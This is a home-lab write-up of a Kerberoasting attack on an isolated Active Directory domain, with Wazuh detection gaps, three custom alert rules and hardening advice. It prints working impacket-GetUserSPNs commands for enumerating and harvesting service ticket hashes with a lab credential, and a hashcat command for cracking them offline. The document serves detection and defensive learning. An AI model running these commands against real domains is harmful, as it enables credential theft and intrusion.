# Kerberoasting — End-to-End Attack and Detection

**Attack date:** 2026-08-27
**Environment:** lab.local (isolated home lab)
**MITRE ATT&CK:** [T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/) (Credential Access)

## Summary

Executed a Kerberoasting attack against a lab Active Directory, harvesting
50 service ticket hashes, cracking one weak password offline, and identifying
a gap in Wazuh's out-of-the-box detection. Wrote 3 custom Wazuh rules to
close the gap, with correlation logic and MITRE tagging.

## Attack chain

### Phase 1 — Reconnaissance
Enumerated SPN-enabled accounts using compromised low-privilege domain user:

​```bash
impacket-GetUserSPNs 'lab.local/DELLA_GUERRERO:LabUser2026!' -dc-ip 10.10.10.10
​```

Result: 50 kerberoastable service accounts identified.

### Phase 2 — TGS harvesting
Requested TGS tickets for all enumerated SPNs:

​```bash
impacket-GetUserSPNs 'lab.local/DELLA_GUERRERO:LabUser2026!' \
  -dc-ip 10.10.10.10 -request -outputfile hashes.txt
​```

Result: 50 `$krb5tgs$23$*` hashes captured (RC4/etype 23).

### Phase 3 — Offline cracking
Attempted crack with rockyou wordlist:

​```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -O -w 1
​```

**Initial result: 0/50 recovered.** BadBlood assigns pseudo-random passwords
resistant to dictionary attacks — a positive finding mirroring hardened
production environments.

**Weak account scenario:** Reconfigured one service account with a weak
password (`Password123`) to demonstrate the full attack chain. Cracked in
under 5 seconds.

## Detection engineering

### Gap identified

Windows Security Log recorded all 50 Event ID 4769 during the attack.
Wazuh's out-of-the-box rules assign level ≤ 3 to individual 4769 events.
Since the default `log_alert_level` is 3, these events do not appear in
the dashboard, effectively hiding the attack pattern from analysts.

Verification method: cross-referenced `Get-WinEvent` count on DC01 against
`/var/ossec/logs/archives/archives.log` on the Wazuh manager.

### Custom rules developed

Three-layer detection written in `local_rules.xml`:

| Rule ID | Level | Purpose |
|---------|-------|---------|
| 100100 | 5 | Baseline visibility — all 4769 events visible in dashboard |
| 100101 | 10 | Kerberoasting fingerprint — RC4-encrypted TGS request (etype 0x17) |
| 100102 | 12 | Attack correlation — 10+ TGS requests from same user in 60s |

Full rule source: [`detections/wazuh/kerberoasting-detection.xml`](../../detections/wazuh/kerberoasting-detection.xml)

### Detection view

MITRE ATT&CK view after attack:

![MITRE T1558.003 with 50 hits](screenshots/02-mitre-view-t1558.png)

Sample alert from rule 100101:

![Custom rule detection detail](screenshots/03-custom-rule-alert.png)

Fields captured:
- `agent.name`: DC01
- `data.win.eventdata.ipAddress`: `::ffff:10.10.10.200` (attacker Kali, IPv6-mapped format)
- `data.win.eventdata.ticketEncryptionType`: `0x17` (RC4)
- `data.win.eventdata.targetUserName`: `DELLA_GUERRERO@LAB.LOCAL`
- `data.win.eventdata.serviceName`: `TAD_HINTON`
- `rule.description`: "Possible Kerberoasting: RC4-encrypted TGS request for service TAD_HINTON"

## Hardening recommendations

For real environments observing this attack pattern:

**Kerberos configuration**
- Force AES-only on service accounts (`msDS-SupportedEncryptionTypes = 24`) — removes RC4 as a valid response
- Migrate to gMSA (Group Managed Service Accounts) where possible — Windows manages the password automatically
- Enforce ≥25 character random passwords on service accounts that cannot use gMSA

**Detection layer**
- Deploy rules equivalent to 100100–100102 (visibility + fingerprint + correlation)
- Ensure Wazuh agents explicitly capture the Security event channel
- Regularly verify pipeline health by cross-referencing agent-side counts against SIEM

**Response**
- Rule 100102 firing should trigger immediate account lockdown for the source user
- Investigate lateral movement from the source IP
- Rotate passwords for all SPNs targeted in the burst

## Key learnings

Documented separately in [troubleshooting/wazuh-runbook.md](../../troubleshooting/wazuh-runbook.md):

- Wazuh agent event channel gaps for Security by default
- Alert-level filtering as a source of invisible detections
- IPv6-mapped IPv4 storage in Windows event fields
- Time filtering methodology for SIEM investigation

## Files in this case

- `README.md` — this write-up
- `screenshots/` — attack execution, MITRE view, custom rule detection
